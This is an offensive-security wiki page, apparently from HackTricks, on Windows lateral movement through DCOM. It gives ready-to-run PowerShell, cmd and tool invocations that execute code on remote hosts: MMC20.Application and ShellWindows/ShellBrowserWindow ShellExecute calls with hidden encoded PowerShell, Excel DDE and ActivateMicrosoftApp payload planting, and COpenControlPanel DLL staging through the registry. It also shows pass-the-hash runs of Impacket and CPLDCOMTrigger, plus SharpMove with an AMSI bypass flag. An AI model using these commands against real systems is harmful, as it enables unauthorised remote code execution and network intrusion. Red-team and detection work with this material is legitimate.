# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement is attractive because it reuses existing COM servers exposed over RPC/DCOM instead of creating a service or scheduled task. In practice this means the initial connection usually starts on TCP/135 and then moves to dynamically assigned high RPC ports.

## Prerequisites & Gotchas

- You usually need a local administrator context on the target and the remote COM server must allow remote launch/activation.
- Since **March 14, 2023**, Microsoft enforces DCOM hardening for supported systems. Old clients that request a low activation authentication level can fail unless they negotiate at least `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients are usually auto-raised, so current tooling normally keeps working.<sup>[[3]](#references)</sup>
- Manual or scripted DCOM execution generally needs TCP/135 plus the target's dynamic RPC port range. If you are using Impacket's `dcomexec.py` and you want command output back, you usually also need SMB access to `ADMIN$` (or another writable/readable share).
- If RPC/DCOM works but SMB is blocked, `dcomexec.py -nooutput` can still be useful for blind execution.

Quick checks:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

For more information about this technique, check the [original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects present an interesting capability for network-based interactions with objects. Microsoft provides comprehensive documentation for both DCOM and Component Object Model (COM), accessible [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and [here for COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). A list of DCOM applications can be retrieved using the PowerShell command:

```bash
Get-CimInstance Win32_DCOMApplication
```

The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Check it running:<sup>[[6]](#references)</sup>

This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

This command connects to the DCOM application and returns an instance of the COM object. The ExecuteShellCommand method can then be invoked to execute a process on the remote host. The process involves the following steps:

Check methods:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Get RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

The last argument is the window style. `7` keeps the window minimized. Operationally, MMC-based execution commonly leads to a remote `mmc.exe` process spawning your payload, which is different from the Explorer-backed objects below.

## ShellWindows & ShellBrowserWindow

**For more info about this technique check the original post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

The **MMC20.Application** object was identified to lack explicit "LaunchPermissions," defaulting to permissions that permit Administrators access. For further details, a thread can be explored [here](https://twitter.com/tiraniddo/status/817532039771525120), and the usage of [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET for filtering objects without explicit Launch Permission is recommended.

Two specific objects, `ShellBrowserWindow` and `ShellWindows`, were highlighted due to their lack of explicit Launch Permissions. The absence of a `LaunchPermission` registry entry under `HKCR:\AppID\{guid}` signifies no explicit permissions.

Compared with `MMC20.Application`, these objects are often quieter from an OPSEC perspective because the command commonly ends up as a child of `explorer.exe` on the remote host instead of `mmc.exe`.

### ShellWindows

For `ShellWindows`, which lacks a ProgID, the .NET methods `Type.GetTypeFromCLSID` and `Activator.CreateInstance` facilitate object instantiation using its AppID. This process leverages OleView .NET to retrieve the CLSID for `ShellWindows`. Once instantiated, interaction is possible through the `WindowsShell.Item` method, leading to method invocation like `Document.Application.ShellExecute`.

Example PowerShell commands were provided to instantiate the object and execute commands remotely:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` is similar, but you can instantiate it directly via its CLSID and pivot to `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateral Movement with Excel DCOM Objects

Lateral movement can be achieved by exploiting DCOM Excel objects. For detailed information, it's advisable to read the discussion on leveraging Excel DDE for lateral movement via DCOM at [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

The Empire project provides a PowerShell script, which demonstrates the utilization of Excel for remote code execution (RCE) by manipulating DCOM objects. Below are snippets from the script available on [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), showcasing different methods to abuse Excel for RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Recent research expanded this area with `Excel.Application`'s `ActivateMicrosoftApp()` method. The key idea is that Excel can try to launch legacy Microsoft applications such as FoxPro, Schedule Plus, or Project by searching the system `PATH`. If an operator can place a payload with one of those expected names in a writable location that is part of the target's `PATH`, Excel will execute it.<sup>[[4]](#references)</sup>

Requirements for this variation:

- Local admin on the target
- Excel installed on the target
- Ability to write a payload to a writable directory in the target's `PATH`

Practical example abusing the FoxPro lookup (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

If the attacking host does not have the local `Excel.Application` ProgID registered, instantiate the remote object by CLSID instead:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Values seen abused in practice:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — loading a registered Control Panel DLL

The `COpenControlPanel` class (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) exposes `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Its `Open()` method causes Control Panel DLLs registered under the `Control Panel\Cpls` key to be loaded by a remote `dllhost.exe`. The class has no explicit launch/access permissions on tested systems, so it inherits the default DCOM policy (normally requiring an administrator for remote activation). A random item name is enough to make `Open()` process the registered DLLs; the payload does not need a `.cpl` extension, although it must be a valid DLL of the correct architecture.<sup>[[7]](#references)</sup>

This primitive is **stage-and-trigger**, not command-only execution: first copy a DLL to the target and create a `REG_EXPAND_SZ` value that points to it, then activate the object over DCOM. For example, from an administrative Windows context:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

The public [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client implements the undocumented DCOM call with Impacket. Supplying an arbitrary Control Panel item name is sufficient; the client can report an RPC error even though `dllhost.exe` loaded the DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operationally, this path also needs a file-write channel and remote registry access, so it is noisier than `MMC20`/`ShellWindows`. It creates a persistence side effect because opening Control Panel later can load the same entry again. Remove the value after execution and hunt for unexpected `Control Panel\Cpls` values together with unusual DLL loads in `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Automation Tools for Lateral Movement

Two tools are highlighted for automating these techniques:

- **Invoke-DCOM.ps1**: A PowerShell script provided by the Empire project that simplifies the invocation of different methods for executing code on remote machines. This script is accessible at the Empire GitHub repository.

- **SharpLateral**: A tool designed for executing code remotely, which can be used with the command:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Automatic Tools

- The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.
- You can use Impacket's `dcomexec.py` to execute commands on remote systems using DCOM. Current builds support `ShellWindows`, `ShellBrowserWindow`, and `MMC20`, and default to `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- You could also use [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- You could also use [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```



## References

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Manage changes for Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Abuse the Power of DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Leveraging Excel DDE for lateral movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Using DCOM objects for remote command execution](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
